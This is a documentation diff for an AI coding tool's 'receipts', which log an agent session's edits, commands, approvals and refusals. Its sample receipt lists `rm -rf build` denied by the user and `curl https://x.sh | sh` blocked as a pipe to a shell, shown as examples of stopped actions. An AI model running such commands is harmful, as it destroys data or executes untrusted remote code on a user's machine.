@@ -10,13 +10,14 @@ names the permission posture that let it.
 # Receipt: Fix the parser
 thread thr_19a0141a · /work/repo · deepseek-flash · Ask · 2026-09-24 10:00 UTC → 2026-09-24 10:05 UTC
 
-Changed 1 file (+2 −1) · ran 1 command · made 1 MCP call · 2 approvals by you · 1 approval by session rule · 1 ran without asking under Ask · 1 denied · 1 other failure
+Changed 1 file (+2 −1) · ran 1 command · made 1 MCP call · 1 approved by you · 1 approved by session rule · 1 ran without asking under Ask · 1 denied by you · 1 other failure
 
 1. edited src/parse.rs (+2 −1) · 1.0s
 2. ran `cargo test -p parser` in /work/repo — exit 0 · 2.5s · approved by you
-3. did not run: ran `rm -rf build` · denied by you
+3. did not run `rm -rf build` · denied by you
 4. called linear · list_issues · 1.0s · approved by session rule
-5. turn failed — failed: provider returned 500
+5. did not run `curl https://x.sh | sh` — refused: Tool 'exec_shell' was denied: Auto-Review blocked a pipe to a shell…
+6. turn failed — failed: provider returned 500
 
 Not recorded:
 - Shell file changes: files a command changes (for example `rm` or a build) are not itemized; only file tools are.
@@ -29,7 +30,7 @@ disagree.
 
 | Surface | What it reads |
 | --- | --- |
-| `/receipts [json] [<turn>]` in the terminal | The current session's transcript and approval log |
+| `/receipts [json] [<turn>]` in the terminal | The current session's transcript and approval log. `json` prints the object in a code block, so it copies out as valid JSON |
 | `codewhale receipts [ID\|--last] [--turn T] [--format md\|json]` | A saved session (id or unique prefix) or a Runtime thread (`thr_…`); with no id, the most recently updated one. `receipt` is an alias |
 | `GET /v1/threads/{id}/receipt`, `GET /v1/threads/{id}/turns/{turn_id}/receipt` | A Runtime thread (the app, `codewhale serve`), behind the normal `/v1` bearer boundary |
 
@@ -54,12 +55,15 @@ the API reads whatever store its server owns.
 
 | Receipt says | Meaning | Recorded as |
 | --- | --- | --- |
-| by you | A person answered: the terminal card, the app, the web mirror, or an API client acting for them | `decided_by: "user"`; Runtime event with no `auto` flag |
-| by session rule | A remembered "for this session" rule answered | `decided_by: "session_rule"`; Runtime event with `auto` and a `grant_id` |
-| by posture | The mode or permission posture answered without a prompt | `decided_by: "posture"`; Runtime event with `auto` or `posture` |
+| approved by you / denied by you | A person answered: the terminal card, the app, the web mirror, or an API client acting for them | `decided_by: "user"`; Runtime event with no `auto` flag |
+| … by session rule | A remembered "for this session" rule answered | `decided_by: "session_rule"`; Runtime event with `auto` and a `grant_id` |
+| … by posture | The mode or permission posture answered without a prompt | `decided_by: "posture"`; Runtime event with `auto` or `posture` |
 | approval timed out | The card expired unanswered | outcome `timeout` |
-| turn stopped while waiting / nobody could be asked | Codewhale resolved it: the turn ended or was cancelled | `decided_by: "host"` |
-| approved (no "by") | A record written before 0.10.1, or a sub-agent's request | no `decided_by` |
+| turn stopped while waiting / nobody could be asked | Codewhale could not ask anyone: the turn had ended or stopped, or the request never reached a person. Counted as not answered, never as a denial, even where the record says `denied` | `decided_by: "host"` |
+| approved / denied, with no "by" | A record written before 0.10.1, or a sub-agent's request. The totals say "(decider not recorded)" | no `decided_by` |
+
+The totals line counts approvals and denials separately, by who gave them:
+`1 approved by you · 1 denied by you` is two decisions.
 
 ### Ran without asking
 
@@ -69,7 +73,30 @@ skip one. Those calls leave no approval record, so the receipt counts them
 instead: `ran_without_asking` is every file change, command, code run, web
 or MCP call, and agent start that ran with no approval on record. The totals
 line names the postures the turns ran under (`9 ran without asking under
-Full Access`). Reads are not counted.
+Full Access`). Reads are not counted, and neither is a call that did not
+start (below).
+
+### Refused before it ran
+
+Codewhale answers a call it will not run with an error result, the same way
+a tool reports a failure: an Auto-Review or guardian block, a tool-policy or
+allow-list denial, a sandbox escalation the posture cannot grant, input that
+did not parse, or a tool that is not available. None of these writes an
+approval, so a receipt reads the result itself:
+
+- **Refused:** the result is Codewhale's own refusal text (`Tool 'x' was
+  denied: …`, `Invalid input for tool …`, `BLOCKED: …`, or a Runtime
+  thread's `Failed to authorize tool execution: …`). Listed as
+  `did not run … — refused: <reason>`, status `not_run`, and counted
+  nowhere else.
+- **Ran and failed:** the result holds an exit code or a line the shell
+  writes only after a process ran (`Command exited with code N`,
+  `Command failed (exit code N)`, a timeout or cancel line). Counted as a
+  command and a failure.
+- **Not shown either way:** a command whose error has neither. Listed as
+  `tried to run … — error, no exit code: <error>`, status `unknown`, not
+  counted as run, with a `not_recorded` note. Other tools that return an
+  error are counted as failures, since the error came from the tool.
 
 Terminal sessions started before 0.9.10 (2026-08-20) have no approval log,
 so their receipts do not count this and say why.
@@ -90,6 +117,8 @@ The receipt says so instead of guessing:
 - **Who decided** for approvals recorded before 0.10.1 and for sub-agent
   approvals.
 - **Which calls asked first** in terminal sessions started before 0.9.10.
+- **Whether a failed command started** when its error has no exit code and
+  no shell status line, and whether a call with no result ran at all.
 - **Why a call ran without asking** beyond the turn's posture: the record
   does not say whether the posture, an allow rule, or a remembered grant let
   it through.
@@ -127,8 +156,9 @@ totals always cover every action, and `omitted_actions` counts the rest.
     "mcp_calls": 1, "plugin_calls": 0, "subagents": 0,
     "approvals": {
       "total": 3, "approved": 2, "denied": 1, "timed_out": 0,
-      "not_answered": 0, "pending": 0, "by_you": 2, "by_session_rule": 1,
-      "by_posture": 0, "decider_not_recorded": 0
+      "not_answered": 0, "pending": 0,
+      "approved_by": { "you": 1, "session_rule": 1, "posture": 0, "not_recorded": 0 },
+      "denied_by": { "you": 1, "session_rule": 0, "posture": 0, "not_recorded": 0 }
     },
     "ran_without_asking": 1, "failures": 1, "other_tool_calls": 0
   },
@@ -162,9 +192,12 @@ tool calls an `execute_tools` program made), `network` (`action`, `host`,
 `query`), `mcp` (`server`, `plugin`), `subagent` (`name`, `agent_id`,
 `outcome`), `approval` (an approval with no matching call), `tool` (any other
 call, listed only when it failed), or `turn_failed`. `status` is `ok`,
-`failed`, `not_run` (held at approval), `interrupted`, `running`, or
-`unknown` (no result in the record). A terminal session's `turn` is the turn
-number; a thread's is the turn id.
+`failed` (ran and failed), `not_run` (held at approval, or refused before
+it started; a refusal carries its reason in `error`), `interrupted`,
+`running`, or `unknown` (no result, or a command error that does not show
+whether it started). A terminal session's `turn` is the turn number; a
+thread's is the turn id. `/receipts 7` or `--turn 7` for a turn the session
+does not have is an error, not an empty receipt.
 
 ## `audit.log` is not the receipt
 
@@ -247,4 +280,6 @@ The builder is deterministic and conservative:
    diff) when saved, otherwise from the call's own input (an edit's
    replacement text, a patch's hunks). A failed call changed nothing and
    carries no counts.
-5. Nothing is derived from display text or model prose.
+5. Nothing is derived from model prose. Two fixed kinds of text Codewhale
+   itself writes are read: the shell's status lines (for an exit code) and
+   its refusal text (for a call it blocked); see "Refused before it ran".
